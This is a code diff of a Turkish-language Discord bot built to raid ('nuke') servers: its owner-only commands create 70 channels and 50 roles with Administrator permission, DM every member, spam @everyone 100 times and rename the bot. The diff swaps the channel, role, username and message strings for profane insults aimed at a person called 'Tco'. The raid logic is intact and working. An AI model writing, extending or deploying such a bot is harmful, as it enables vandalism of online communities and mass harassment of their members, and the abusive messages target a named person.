@@ -13,7 +13,7 @@ client.login(config.token);
 // Event handler
 client.once('ready', () => {
   console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);
-  client.user.setActivity('Kitty Kat', { type: 'PLAYING' });
+  client.user.setActivity('Guvenlik', { type: 'PLAYING' });
 });
 
 // Event handler for message creation
@@ -26,7 +26,7 @@ client.on('messageCreate', async (msg) => {
       const channelsToCreate = [];
       let i = 0;
       while (i < 70) {
-        channelsToCreate.push({ name: 'hacked', type: ChannelType.GuildText });
+        channelsToCreate.push({ name: 'Tco Siker Atar', type: ChannelType.GuildText });
         i++;
       }
 
@@ -74,7 +74,7 @@ client.on('messageCreate', async (msg) => {
       // Update bot settings
       try {
         await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await client.user.setUsername('Patlatıldı uwu');
+        await client.user.setUsername('TCO Siker');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -98,7 +98,7 @@ client.on('messageCreate', async (msg) => {
 '+dm': async () => {
   if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
   await msg.delete();
-  const message = '**Bir sunucu sevilmiştir haberiniz osun! İYİGÜNLEEEER :3** :wink:';
+  const message = 'Bir daha görünüz kalkmasın Tco siker';
   
   await Promise.all(
     msg.guild.members.cache.map(member => {
@@ -131,7 +131,7 @@ client.on('messageCreate', async (msg) => {
   let count = 0;
   while (count < 50) {
     await msg.guild.roles.create({
-      name: 'HACKED',
+      name: 'TCO SIKER',
       color: 'FF3E00',
       permissions: [PermissionFlagsBits.Administrator]
     }).then(() => console.log(`Rol ${count + 1} oluşturuldu.`)).catch(err => console.error(`Rol oluşturma hatası: ${err}`));
@@ -141,7 +141,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+spam': async () => {
       await msg.delete();
-      const spamMessage = '**Ş-şey b-bu sunucusu patlatılmıştır uwu** @everyone :heart: :heart:';
+      const spamMessage = '**Bu sunucu bazı kişilerin götleri kalktığı için patlatılmıştır ** @everyone';
       for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
